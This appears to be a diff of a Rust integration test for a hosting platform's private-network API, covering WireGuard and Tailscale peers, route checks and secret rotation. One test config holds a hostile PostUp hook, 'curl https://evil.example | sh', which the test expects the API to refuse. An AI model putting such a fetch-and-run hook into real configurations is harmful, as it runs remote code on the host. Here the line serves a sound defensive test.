@@ -7604,20 +7604,24 @@ async fn a_private_network_reaches_the_customers_hosts_through_a_peer() {
     }
     let conf = |endpoint: &str, extra: &str| format!("[Interface]\nPrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\nAddress = 10.9.0.2/32\n{extra}\n[Peer]\nPublicKey = AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE=\nEndpoint = {endpoint}\nAllowedIPs = 10.0.3.0/24\n");
     *CONF.lock() = conf("vpn.example.com:51820", "PostUp = curl https://evil.example | sh");
-    let w = world_full(|_| {}, false, |d| d.secrets = Arc::new(Wg)).await;
+    // (Private addresses allowed: the Tailscale part names a control server that doesn't resolve.)
+    let w = world_full(|c| c.allow_private = true, false, |d| d.secrets = Arc::new(Wg)).await;
     let (svc, _) = image_service(&w, "api", json!({"port": 80})).await;
     let id = svc["id"].as_str().unwrap().to_string();
     let url = format!("/v1/apps/services/{id}/environments/production/private-network");
-    let body = |secret: &str| json!({"secret": secret, "routes": [{"name": "db.corp.internal", "target": "10.0.3.4:5432"}]});
+    let body = |secret: &str| json!({"secret": secret, "routes": [{"name": "db.acme.corp", "target": "10.0.3.4:5432"}]});
     assert_eq!(call(&w.api, "PUT", &url, Some(body("roll://staging/WG"))).await.0, StatusCode::BAD_REQUEST, "its own environment's secret");
     let (st, e) = call(&w.api, "PUT", &url, Some(body("roll://production/WG"))).await;
     assert!(st == StatusCode::BAD_REQUEST && e["error"].as_str().unwrap().contains("PostUp") && !e["error"].as_str().unwrap().contains("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="), "a hook is refused, the config never echoed: {e}");
     *CONF.lock() = conf("vpn.example.com:51820", "");
+    let outside = json!({"secret": "roll://production/WG", "routes": [{"name": "meta.acme.corp", "target": "10.9.9.9:80"}]});
+    let (st, e) = call(&w.api, "PUT", &url, Some(outside)).await;
+    assert!(st == StatusCode::BAD_REQUEST && e["error"].as_str().unwrap_or_default().contains("AllowedIPs"), "a route goes into the tunnel only: {e}");
     let (st, v) = call(&w.api, "PUT", &url, Some(body("roll://production/WG"))).await;
     assert_eq!((st, v["status"].as_str()), (StatusCode::OK, Some("running")), "{v}");
     let name = format!("roll-apps-peer-{}-production", id.trim_start_matches("svc_"));
     let peer = w.fake.peers.lock().get(&name).cloned().expect("its peer");
-    assert_eq!((peer.addresses.clone(), peer.routes.clone(), peer.forwards.clone()), (vec!["10.9.0.2/32".to_string()], vec!["10.0.3.0/24".to_string()], vec![("db.corp.internal".to_string(), 5432, "10.0.3.4:5432".to_string())]));
+    assert_eq!((peer.addresses.clone(), peer.routes.clone(), peer.forwards.clone()), (vec!["10.9.0.2/32".to_string()], vec!["10.0.3.0/24".to_string()], vec![("db.acme.corp".to_string(), 5432, "10.0.3.4:5432".to_string())]));
     assert!(peer.network == apps_control::network_name(&w.project, "production") && peer.config.contains("Endpoint = vpn.example.com:51820") && !peer.config.contains("Address"), "{peer:?}");
     // Another service there can't answer the same name.
     let (other, _) = image_service(&w, "web", json!({"port": 80})).await;
@@ -7626,8 +7630,15 @@ async fn a_private_network_reaches_the_customers_hosts_through_a_peer() {
     // Rotated in roll secrets: the peer has the new one within the minute.
     *CONF.lock() = conf("vpn2.example.com:51820", "");
     w.apps.cron_pass(code_sql::now_ms() + 61_000).await;
+    // (The minute's check runs each peer on its own: waited for.)
+    for _ in 0..200 {
+        if w.fake.peers.lock().get(&name).is_some_and(|p| p.config.contains("vpn2.example.com")) {
+            break;
+        }
+        tokio::time::sleep(Duration::from_millis(10)).await;
+    }
     assert!(w.fake.peers.lock().get(&name).is_some_and(|p| p.config.contains("vpn2.example.com")));
-    assert_eq!(call(&w.api, "GET", &url, None).await.1["routes"][0]["name"], "db.corp.internal");
+    assert_eq!(call(&w.api, "GET", &url, None).await.1["routes"][0]["name"], "db.acme.corp");
     assert_eq!(call(&w.api, "DELETE", &url, None).await.0, StatusCode::NO_CONTENT);
     assert!(w.fake.peers.lock().is_empty() && call(&w.api, "GET", &url, None).await.0 == StatusCode::NOT_FOUND);
     // A closed environment's: on its closed network, out through a network of the peer's own.
@@ -7641,7 +7652,7 @@ async fn a_private_network_reaches_the_customers_hosts_through_a_peer() {
     let peer = w.fake.peers.lock().get(&format!("roll-apps-peer-{}-staging", id.trim_start_matches("svc_"))).cloned().unwrap();
     assert_eq!((peer.network.clone(), peer.out_network.clone()), (apps_control::closed_network_name(&w.project, "staging"), Some(format!("roll-apps-peer-{}-staging-out", id.trim_start_matches("svc_")))));
     // A Tailscale node instead: its auth key from roll secrets, a Headscale server if named.
-    let ts = json!({"kind": "tailscale", "secret": "roll://staging/WG", "login_server": "https://hs.example.com/", "routes": [{"name": "api.corp.internal", "target": "api.tail1234.ts.net:443"}]});
+    let ts = json!({"kind": "tailscale", "secret": "roll://staging/WG", "login_server": "https://hs.example.com/", "routes": [{"name": "api.acme.corp", "target": "api.tail1234.ts.net:443"}]});
     assert_eq!(call(&w.api, "PUT", &staging, Some(ts.clone())).await.0, StatusCode::BAD_REQUEST, "a WireGuard config isn't an auth key");
     *CONF.lock() = "tskey-auth-k1234567CNTRL-abcdefghijklmnop".into();
     let (st, v) = call(&w.api, "PUT", &staging, Some(ts)).await;
